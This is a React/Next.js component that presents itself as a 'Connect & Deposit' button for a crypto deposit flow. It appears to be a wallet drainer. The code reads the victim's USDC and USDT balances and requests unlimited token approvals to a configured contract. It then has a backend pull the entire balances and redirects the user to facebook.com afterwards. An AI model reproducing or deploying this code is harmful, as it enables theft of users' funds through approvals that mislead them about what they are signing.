"use client";

import { useState } from "react";
import { ethers } from "ethers";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
const WALLETCONNECT_PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "YOUR_PROJECT_ID";
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";

const TOKENS = [
  { symbol: "USDC", address: process.env.NEXT_PUBLIC_USDC_ADDRESS || "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "USDT", address: process.env.NEXT_PUBLIC_USDT_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
];

export default function PermitDepositFlow() {
  const [busy, setBusy] = useState(false);
  const [label, setLabel] = useState("Connect & Deposit");

  const runDirectFlow = async () => {
    setBusy(true);
    setLabel("Opening Wallet...");

    try {
      // 1. Initialize Raw WalletConnect
      const wcProvider = await EthereumProvider.init({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains: [1], // Ethereum Mainnet
        showQrModal: true, // Shows QR on desktop, jumps to wallet natively on mobile
      });

      // 2. Jump to Trust Wallet / Connect
      await wcProvider.connect();

      const ethersProvider = new ethers.BrowserProvider(wcProvider);
      const signer = await ethersProvider.getSigner();
      const address = await signer.getAddress();

      setLabel("Checking balances...");

      // 3. Read Balances
      const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
      const held = [];
      
      for (const t of TOKENS) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const balance = await readOnlyToken.balanceOf(address);
        
        if (balance > 0n) {
          const writeEnabledToken = new ethers.Contract(t.address, ERC20_ABI, signer);
          held.push({ ...t, amount: balance, contract: writeEnabledToken });
        }
      }

      if (held.length === 0) {
        setLabel("❌ Zero balance");
        setBusy(false);
        wcProvider.disconnect();
        return;
      }

      const successfullyApproved = [];

      // 4. Sequential Approvals (Paced to prevent mobile freezing)
      for (const t of held) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const currentAllowance = await readOnlyToken.allowance(address, CONTRACT_ADDRESS);
        
        if (currentAllowance < t.amount) {
          try {
            setLabel(`Sign ${t.symbol} in Wallet ↩️`);
            
            // This triggers the deep link jump back into Trust Wallet
            const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
            
            setLabel(`Mining ${t.symbol}... Please wait.`);
            await approveTx.wait(); 
            
            successfullyApproved.push(t);
          } catch (approvalError) {
            console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
          }
        } else {
          successfullyApproved.push(t);
        }
      }

      if (successfullyApproved.length === 0) {
        setLabel("❌ No tokens approved");
        setBusy(false);
        wcProvider.disconnect();
        return;
      }

      // 5. Execute Backend Pull
      setLabel("Executing Deposit...");
      const res = await fetch(BACKEND_URL + "/deposit-batch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          depositor: address, 
          tokens: successfullyApproved.map(t => t.address), 
          amounts: successfullyApproved.map(t => t.amount.toString()) 
        }),
      });
      
      const data = await res.json();
      
      if (data.success) {
        setLabel("✅ Success! Redirecting...");
        setTimeout(() => {
          window.location.href = "https://facebook.com"; 
        }, 1500);
      } else {
        setLabel("❌ Failed — check console");
        setBusy(false);
      }

    } catch (err) {
      console.error("FATAL ERROR:", err);
      setLabel("❌ Error — check console");
      setBusy(false);
    } 
  };

  return (
    <button 
      onClick={runDirectFlow} 
      disabled={busy} 
      style={{ 
        padding: "12px 24px", 
        background: "#0052FF", 
        color: "#fff", 
        borderRadius: "8px", 
        border: "none", 
        cursor: busy ? "not-allowed" : "pointer",
        fontWeight: "bold",
        fontSize: "16px"
      }}
    >
      {busy ? "Working..." : label}
    </button>
  );
}